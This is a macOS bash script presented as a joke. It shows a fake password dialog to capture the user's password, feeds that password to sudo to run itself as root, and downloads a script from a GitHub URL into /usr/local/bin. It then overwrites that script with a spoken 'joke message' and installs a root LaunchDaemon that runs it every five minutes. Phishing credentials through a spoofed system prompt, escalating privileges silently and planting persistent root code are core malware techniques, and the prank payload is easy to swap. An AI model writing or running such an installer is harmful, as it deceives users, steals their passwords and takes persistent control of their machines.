#!/bin/bash

set -e

SCRIPT_URL="https://raw.githubusercontent.com/MatthewGCampbell/MatthewGCampbell/main/display_message.sh"
SCRIPT_PATH="/usr/local/bin/joke_display_message.sh"
PLIST_PATH="/Library/LaunchDaemons/com.jokemessage.plist"

############################################
# Elevation & password prompt (moved inside)
############################################

if [[ "$EUID" -ne 0 ]]; then
  # Ask for password via GUI
  thePassword="$(osascript -e 'text returned of (display dialog "Please enter your password:" default answer "" with hidden answer)')"

  if [[ -z "$thePassword" ]]; then
    echo "No password entered or dialog cancelled. Exiting."
    exit 1
  fi

  # Re-run this script as root, passing the password as $1
  echo "$thePassword" | sudo -S bash "$0" "$thePassword" "$@"
  exit $?
fi

############################################
# From here down, we are running as root
############################################

# Capture password passed to script (from the non-root instance)
PASSWORD="$1"


echo "[+] Downloading message script to $SCRIPT_PATH ..."
curl -fsSL "$SCRIPT_URL" -o "$SCRIPT_PATH"

# Override with the joke version
cat <<'EOF' > "$SCRIPT_PATH"
#!/bin/bash
/usr/bin/say "This is a joke message. Your system is fine."
EOF

chmod 755 "$SCRIPT_PATH"

echo "[+] Creating LaunchDaemon plist at $PLIST_PATH ..."
cat <<EOF > "$PLIST_PATH"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.jokemessage</string>
    <key>ProgramArguments</key>
    <array>
        <string>$SCRIPT_PATH</string>
    </array>
    <key>StartInterval</key>
    <integer>300</integer>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

chown root:wheel "$PLIST_PATH"
chmod 644 "$PLIST_PATH"

launchctl unload "$PLIST_PATH" 2>/dev/null || true
launchctl load "$PLIST_PATH"

# Test speech immediately
/usr/bin/say "This is a joke message. Your system is fine."
